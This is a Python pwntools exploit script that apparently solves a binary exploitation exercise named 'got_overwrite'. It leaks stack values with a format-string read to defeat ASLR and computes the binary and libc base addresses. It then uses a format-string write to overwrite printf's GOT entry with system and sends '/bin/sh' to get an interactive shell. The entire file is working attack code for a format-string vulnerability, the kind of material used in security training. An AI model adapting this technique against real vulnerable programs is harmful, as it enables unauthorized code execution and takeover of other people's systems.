import os
import time

import pwn

script_dir = os.path.dirname(os.path.realpath(__file__))
elf_path = os.path.join(script_dir, "./got_overwrite")
libc_path = os.path.join(script_dir, "./../.lib/libc.so.6")


def write_with_fsb(io, addr, value):
    payload = pwn.fmtstr_payload(6, {addr: value}, write_size="short")
    print(f"%n FSB payload: {payload}")
    io.sendline(payload)
    time.sleep(0.2)


def exploit(io, elf, libc):
    io.sendline(b"%17$lx:%21$lx")
    main_37, __libc_start_main_234 = map(
        lambda x: int(x, 16), io.recvline().split(b":")
    )
    __libc_start_main_ofs = 0x26C20

    elf.address = main_37 - 37 - elf.sym.main
    libc.address = __libc_start_main_234 - __libc_start_main_ofs - 234
    print(f"elf - base_addr: {hex(elf.address)}")
    print(f"libc - base_addr: {hex(libc.address)}")

    write_with_fsb(io, addr=elf.got["printf"], value=libc.sym.system)

    io.sendline("/bin/sh")
    io.clean()


def main():
    elf = pwn.context.binary = pwn.ELF(elf_path)
    libc = pwn.ELF(libc_path)
    if pwn.args.GDB:
        io = pwn.gdb.debug(elf.path)
    else:
        io = pwn.process(elf.path)

    exploit(io, elf, libc)
    io.interactive()


if __name__ == "__main__":
    main()
